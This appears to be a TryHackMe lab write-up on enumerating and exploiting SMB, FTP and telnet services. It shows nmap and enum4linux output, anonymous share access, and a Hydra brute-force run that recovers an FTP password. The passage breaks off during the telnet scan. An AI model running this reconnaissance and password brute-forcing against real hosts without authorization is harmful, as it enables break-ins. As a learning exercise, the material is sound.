
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-1.png)

### SMB
- client server communication protocol used for sharing access to files, printers, serial ports and other resources on a network
- samba is for unix systems
-  enables an application -- or the user of an application -- to access files on a remote server, as well as other resources, including printers, mail slots and named pipes. Thus, a client application can open, read, move, create and update files on the remote server.

```text
# Nmap 7.80 scan initiated Wed Nov 18 06:33:17 2020 as: nmap -sS -T4 -oN smb_scan.txt 10.10.199.237
Nmap scan report for 10.10.199.237
Host is up (0.061s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Wed Nov 18 06:33:18 2020 -- 1 IP address (1 host up) scanned in 1.88 seconds
```

```text
# Nmap 7.80 scan initiated Wed Nov 18 06:33:38 2020 as: nmap -sV -sC -p22,139,445 -oN smb_scan1.txt 10.10.199.237
Nmap scan report for 10.10.199.237
Host is up (0.056s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
|_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 14s, deviation: 0s, median: 14s
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2020-11-18T11:34:07+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-18T11:34:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 18 06:33:54 2020 -- 1 IP address (1 host up) scanned in 16.07 seconds
```

```text
enum4linux 10.10.199.237
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov 18 06:35:37 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.199.237
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.199.237    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.199.237    |
 ============================================= 
Looking up status of 10.10.199.237
        POLOSMB         <00> -         B <ACTIVE>  Workstation Service
        POLOSMB         <03> -         B <ACTIVE>  Messenger Service
        POLOSMB         <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.199.237    |
 ====================================== 
[+] Server 10.10.199.237 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.199.237    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.199.237    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.199.237 from smbclient: 
[+] Got OS info for 10.10.199.237 from srvinfo:
        POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================== 
|    Users on 10.10.199.237    |
 ============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================== 
|    Share Enumeration on 10.10.199.237    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.199.237
//10.10.199.237/netlogon        [E] Can't understand response:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
//10.10.199.237/profiles        Mapping: OK, Listing: OK
//10.10.199.237/print$  Mapping: DENIED, Listing: N/A
//10.10.199.237/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.199.237    |
 ===================================================== 


[+] Attaching to 10.10.199.237 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] POLOSMB
        [+] Builtin

[+] Password Info for Domain: POLOSMB

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 10.10.199.237    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.199.237 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-434125608-3964652802-3194254534
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-434125608-3964652802-3194254534 and logon username '', password ''
S-1-5-21-434125608-3964652802-3194254534-500 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-501 POLOSMB\nobody (Local User)
S-1-5-21-434125608-3964652802-3194254534-502 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-503 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-504 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-505 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-506 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-507 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-508 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-509 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-510 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-511 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-512 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-513 POLOSMB\None (Domain Group)
S-1-5-21-434125608-3964652802-3194254534-514 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-515 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-516 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-517 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-518 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-519 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-520 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-521 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-522 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-523 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-524 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-525 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-526 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-527 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-528 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-529 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-530 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-531 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-532 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-533 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-534 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-535 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-536 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-537 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-538 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-539 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-540 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-541 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-542 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-543 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-544 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-545 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-546 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-547 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-548 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-549 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-550 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1000 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1001 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1002 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1003 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1004 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1005 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1006 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1007 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1008 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1009 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1010 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1011 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1012 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1013 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1014 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1015 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1016 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1017 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1018 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1019 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1020 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1021 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1022 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1023 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1024 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1025 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1026 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1027 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1028 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1029 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1030 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1031 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1032 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1033 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1034 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1035 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1036 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1037 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1038 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1039 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1040 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1041 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1042 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1043 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1044 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1045 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1046 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1047 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1048 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1049 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cactus (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)

 ============================================== 
|    Getting printer info for 10.10.199.237    |
 ============================================== 
No printers returned.


enum4linux complete on Wed Nov 18 06:41:49 2020
```
smbclient — ftp-like client to access SMB/CIFS resources on servers and is also part of the samba suite.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-2.png)

smbclient is a client that can  'talk' to an SMB/CIFS server. It offers an interface  similar to that of the ftp program.  Operations include things like getting files from the server  to the local machine, putting files from the local machine to  the server, retrieving directory information from the server  and so on. 

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-3.png)  
To download the text file which has spaces in name it is necessary to enclose it with "". The command turns into get "Working From Home Information.txt"  
```text
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 
```
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-4.png)  
Now ssh into the service.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services/images/130-5.png)  

##### Resources
https://www.computerhope.com/unix/smbclien.htm  
https://www.samba.org/samba/docs/current/man-html/smbclient.1.html  


### FTP

```text
# Nmap 7.80 scan initiated Wed Nov 18 04:18:48 2020 as: nmap -sS -T4 -oN ftp.txt 10.10.147.196
Nmap scan report for 10.10.147.196
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

# Nmap done at Wed Nov 18 04:18:56 2020 -- 1 IP address (1 host up) scanned in 8.48 seconds
```

```text
# Nmap 7.80 scan initiated Wed Nov 18 04:19:18 2020 as: nmap -sV -sC -p21,80 -oN ftp_detailed.txt 10.10.147.196
Nmap scan report for 10.10.147.196
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.5.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 18 04:19:35 2020 -- 1 IP address (1 host up) scanned in 16.78 seconds
```

```text
ftp 10.10.147.196
Connected to 10.10.147.196.
220 Welcome to the administrator FTP service.
Name (10.10.147.196:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 24  2020 .
drwxr-xr-x    2 0        0            4096 Apr 24  2020 ..
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
226 Transfer complete.
353 bytes received in 0.00 secs (95.5186 kB/s)
ftp> exit
221 Goodbye.
```


```text
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
```

```text
# Hydra v9.0 run at 2020-11-18 04:25:33 on 10.10.147.196 ftp (hydra -l mike -P /usr/share/wordlists/rockyou.txt -o ftp_hydra.txt 10.10.147.196 ftp)
[21][ftp] host: 10.10.147.196   login: mike   password: password
```

```text
 ftp 10.10.147.196
Connected to 10.10.147.196.
220 Welcome to the administrator FTP service.
Name (10.10.147.196:root): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    5 1002     1006         4096 Apr 24  2020 .
drwxr-xr-x    5 0        0            4096 Apr 24  2020 ..
-rw-r--r--    1 0        0               0 Apr 24  2020 .bash_history
-rw-r--r--    1 1002     1006          220 Apr 24  2020 .bash_logout
-rw-r--r--    1 1002     1006         3771 Apr 24  2020 .bashrc
drwx------    2 0        0            4096 Apr 24  2020 .cache
drwx------    3 0        0            4096 Apr 24  2020 .gnupg
-rw-r--r--    1 1002     1006          807 Apr 24  2020 .profile
-rw-r--r--    1 0        0               0 Apr 24  2020 .sudo_as_admin_successful
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
ftp> get ftp.txt 
local: ftp.txt remote: ftp.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
226 Transfer complete.
26 bytes received in 0.00 secs (17.4746 kB/s)
ftp> exit
221 Goodbye.
```

The ftp.txt has the flag.

### TELNET

Telnet is an insecure protocol because it lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.

```text
# Nmap 7.80 scan initiated Wed Nov 18 04:47:17 2020 as: nmap -A -p- -oN telnet_scan.txt 10.10.110.177
Nmap scan report for 10.10.110.177
Host is up (0.056s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.80%I=7%D=11/18%Time=5FB4EE1C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to
SF:\x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type
SF:\x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20B
SF:ACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest
SF:,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\
SF:n")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vie
SF:w\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20T
SF:ype\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:Help,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
SF:nds\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20
SF:to\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDO
SF:OR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E
SF:,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")
SF:%r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x
SF:20commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20
SF:Type\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SK
SF:IDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(L
SF:PDString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
SF:ommands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\
SF:x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'
SF:S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDe
SF:sk-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comm
